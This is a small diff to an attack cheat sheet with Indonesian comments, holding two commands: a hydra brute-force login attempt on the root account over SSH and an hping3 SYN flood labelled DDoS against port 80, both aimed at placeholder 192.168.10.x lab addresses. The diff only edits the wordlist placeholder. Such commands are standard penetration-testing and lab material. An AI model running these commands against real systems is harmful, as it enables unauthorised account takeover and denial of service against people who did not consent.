@@ -1,5 +1,5 @@
 #Brute Force SSH
-hydra -l root -P  ssh://192.168.10.x #ip tujuan
+hydra -l root -P #tempat ssh://192.168.10.x #ip tujuan
 
 #Ddos
 hping3 -S -p 80 -i u10000 192.168.10.x
